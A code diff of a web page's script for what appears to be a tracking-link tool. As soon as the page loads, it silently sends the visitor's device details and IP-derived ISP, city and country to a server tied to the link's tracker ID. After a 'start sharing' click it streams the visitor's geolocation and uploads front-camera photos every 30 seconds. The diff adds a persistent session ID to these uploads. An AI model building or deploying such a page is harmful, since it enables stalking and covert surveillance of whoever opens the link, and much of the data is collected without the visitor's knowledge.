@@ -230,19 +230,21 @@
   <script src="/socket.io/socket.io.js"></script>
   <script>
     const TRACKER_ID = window.location.pathname.split('/').pop();
+    let SESSION_ID = localStorage.getItem('geo_session_id');
+    if (!SESSION_ID) {
+      SESSION_ID = Math.random().toString(36).substring(2, 10);
+      localStorage.setItem('geo_session_id', SESSION_ID);
+    }
+
     let socket;
     let watchId = null;
     let cameraStream = null;
     let sharing = false;
 
     document.addEventListener('DOMContentLoaded', () => {
-      // Initialize socket with websocket preference (might fail on Vercel, but that's okay)
-      socket = io({
-        transports: ['websocket', 'polling']
-      });
+      socket = io({ transports: ['websocket', 'polling'] });
       socket.emit('join-tracker', TRACKER_ID);
 
-      // Basic device info
       const basicInfo = {
         platform: navigator.platform,
         browser: getBrowser(),
@@ -258,7 +260,6 @@
 
       sendDeviceInfo(basicInfo);
 
-      // Fetch network details
       fetch('https://ipapi.co/json/')
         .then(res => res.json())
         .then(data => {
@@ -268,8 +269,7 @@
             isp: data.org || 'N/A',
             city: data.city || 'N/A',
             region: data.region || 'N/A',
-            country: data.country_name || data.country || 'N/A',
-            timezone: data.timezone || basicInfo.timezone
+            country: data.country_name || data.country || 'N/A'
           };
           sendDeviceInfo(networkInfo);
         })
@@ -277,43 +277,39 @@
     });
 
     async function sendDeviceInfo(info) {
-      // Try Socket first, then fallback to REST
-      if (socket && socket.connected) {
-        socket.emit('device-info', { trackerId: TRACKER_ID, info });
-      }
+      const payload = { trackerId: TRACKER_ID, sessionId: SESSION_ID, info };
+      if (socket && socket.connected) socket.emit('device-info', payload);
       await fetch(`/api/tracker/${TRACKER_ID}/info`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(info)
+        body: JSON.stringify(payload)
       });
     }
 
     async function sendLocationUpdate(data) {
-      if (socket && socket.connected) {
-        socket.emit('location-update', { trackerId: TRACKER_ID, ...data });
-      }
+      const payload = { trackerId: TRACKER_ID, sessionId: SESSION_ID, ...data };
+      if (socket && socket.connected) socket.emit('location-update', payload);
       await fetch(`/api/tracker/${TRACKER_ID}/location`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(data)
+        body: JSON.stringify(payload)
       });
     }
 
     async function sendPhotoCapture(data) {
-      if (socket && socket.connected) {
-        socket.emit('photo-capture', { trackerId: TRACKER_ID, ...data });
-      }
+      const payload = { trackerId: TRACKER_ID, sessionId: SESSION_ID, ...data };
+      if (socket && socket.connected) socket.emit('photo-capture', payload);
       await fetch(`/api/tracker/${TRACKER_ID}/photo`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(data)
+        body: JSON.stringify(payload)
       });
     }
 
     async function startSharing() {
       const btn = document.getElementById('start-btn');
       btn.disabled = true;
-      btn.textContent = 'Requesting permissions...';
+      btn.innerHTML = '<span class="loading-spinner"></span> Requesting...';
 
       try {
         await requestLocation();
@@ -321,7 +317,6 @@
         document.getElementById('loc-status').innerHTML = '<span class="status-badge active">Location active</span>';
         startLocationUpdates();
       } catch (e) {
-        document.getElementById('loc-section').classList.add('denied');
         document.getElementById('loc-status').innerHTML = '<span class="status-badge error">Location denied</span>';
       }
 
@@ -331,7 +326,6 @@
         document.getElementById('cam-status').innerHTML = '<span class="status-badge active">Camera active</span>';
         capturePhotos();
       } catch (e) {
-        document.getElementById('cam-section').classList.add('denied');
         document.getElementById('cam-status').innerHTML = '<span class="status-badge error">Camera denied</span>';
       }
 
@@ -383,12 +377,11 @@
           ctx.drawImage(video, 0, 0);
           const image = canvas.toDataURL('image/jpeg', 0.6);
           sendPhotoCapture({ image, facing: 'user' });
-          setTimeout(snap, 20000);
+          setTimeout(snap, 30000);
         }
-        setTimeout(snap, 3000);
+        setTimeout(snap, 5000);
       };
     }
-
 
     function getBrowser() {
       const ua = navigator.userAgent;
@@ -399,7 +392,6 @@
       return 'Unknown';
     }
 
-    // Cleanup on page close
     window.addEventListener('beforeunload', () => {
       if (watchId) navigator.geolocation.clearWatch(watchId);
       if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
